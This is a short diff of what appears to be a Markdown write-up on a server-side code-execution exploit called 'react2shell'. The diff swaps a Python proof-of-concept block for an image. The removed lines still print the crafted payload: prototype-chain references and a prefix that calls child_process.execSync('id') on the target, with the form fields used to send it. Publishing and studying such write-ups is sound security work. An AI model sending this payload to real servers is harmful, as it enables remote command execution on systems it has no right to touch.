@@ -67,24 +67,7 @@ The exploit crafts a malicious payload that:
 
 Here's the core of the proof-of-concept:
 
-```python
-crafted_chunk = {
-    "then": "$1:__proto__:then",
-    "status": "resolved_model",
-    "value": '{"then": "$B0"}',
-    "_response": {
-        "_prefix": "process.mainModule.require('child_process').execSync('id');",
-        "_formData": {
-            "get": "$1:constructor:constructor",
-        },
-    },
-}
-
-files = {
-    "0": (None, json.dumps(crafted_chunk)),
-    "1": (None, '"$@0"'),
-}
-```
+![react2shell POC Core](./react2shell-poc-core.png)
 
 Running this against the vulnerable server:
 
